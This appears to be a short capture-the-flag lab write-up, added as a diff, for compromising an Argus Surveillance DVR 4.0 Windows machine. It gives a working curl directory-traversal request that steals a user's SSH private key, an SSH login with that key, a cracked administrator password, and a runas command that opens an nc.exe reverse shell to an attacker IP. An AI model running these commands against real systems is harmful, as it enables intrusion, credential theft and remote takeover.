@@ -1,0 +1,44 @@
+DVR4 - Intermediate
+
+//Enumeration
+web page - Argus Surveillance version 4
+
+Known Directory Traversal and weakpassword encryption vulnerabilities.
+----------------------------------------------------------------------------
+//Local Exploit
+
+CVE2018-15745 Argus Surveillance DVR 4.0.0.0 - Directory Traversal 
+
+(path to ssh private key in windows - C:\Users\Viewer\.ssh\id_rsa)
+
+curl "http://192.168.139.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa
+
+chmod 600 id_rsa
+
+ssh viewer@192.168.139.179 -i id_rsa
+
+----------------------------------------------------------------------------
+//Priv Esc
+
+50130 - Argus Surveillance DVR 4.0 - Weak Password Encryption
+
+Argus Surveillance DVR 4.0 configuration is present in C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
+
+Replace the hash value in our exploit and run the exploit.
+
+Cracked Password: 14WatchD0g_  (Last special character is unknown. Try with all special characters)
+
+Admin Shell: 
+
+C:\Users\viewer>runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.175 4444"
+Enter the password for Administrator: 
+Attempting to start nc.exe -e cmd.exe 192.168.45.175 4444 as user "DVR4\Administrator" ...
+
+
+
+
+
+
+
+
+
